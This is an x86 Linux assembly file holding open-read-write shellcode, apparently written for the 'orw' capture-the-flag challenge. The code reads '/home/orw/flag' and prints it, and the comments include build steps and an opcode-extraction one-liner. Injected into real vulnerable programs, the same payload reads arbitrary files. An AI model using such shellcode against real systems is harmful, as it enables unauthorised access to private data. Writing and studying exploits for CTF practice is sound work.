; Shellcode which displays content of ./flag.txt file
;
; To test compile, link and run:
; $ nasm -f elf shellcode.asm -o shellcode.o
; $ ld -m elf_i386 shellcode.o -o shellcode
; $ ./shellcode
;
; To extract opcodes:
; $ for i in `objdump -d shellcode.o |grep "^ " |cut -f2`; do echo -n '\x'$i; done; echo

section .text
global _start

_start:
    jmp to_the_end

open_flag_file:
    pop ebx         ; filename=address of "flag.txt"
    mov ecx, 0x0    ; flags=O_RDONLY
    mov edx, 0x0    ; no mode
    mov eax, 0x5    ; sys_open()
    int 0x80        ; exec open()

read_flag_content:
    mov ebx, eax    ; fd from above open is in eax
    mov ecx, esp    ; just read content on stack
    mov edx, 0x30   ; just read whole flag
    mov eax, 0x3    ; sys_read()
    int 0x80        ; exec read()

write_flag_content:
    mov ebx, 0x1    ; write flag to stdout
                    ; don't change ecx as it points already on flag content
    mov eax, 0x4    ; sys_write()
    int 0x80        ; exec write()

exit:
    mov ebx, 0x0    ; exit with no error code
    mov eax, 0x01   ; sys_exit()
    int 0x80        ; exec exit()


to_the_end:
    call open_flag_file
    db '/home/orw/flag', 0, 'A'